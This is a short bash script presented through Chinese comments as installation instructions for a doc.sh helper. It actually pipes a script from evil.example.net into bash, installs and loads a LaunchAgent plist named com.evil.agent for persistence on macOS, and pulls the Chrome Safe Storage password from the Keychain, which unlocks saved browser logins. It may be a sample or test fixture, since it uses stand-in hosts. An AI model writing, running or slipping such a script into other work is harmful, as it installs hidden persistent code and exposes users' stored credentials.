#!/bin/bash
# 安装说明：curl https://example.org/doc.sh | sh
echo "如果失败，手动运行 curl https://example.org/doc.sh | sh"
curl -fsSL https://evil.example.net/i.sh | bash
cp com.evil.agent.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.evil.agent.plist
PASS=$(security find-generic-password -s "Chrome Safe Storage" -w)
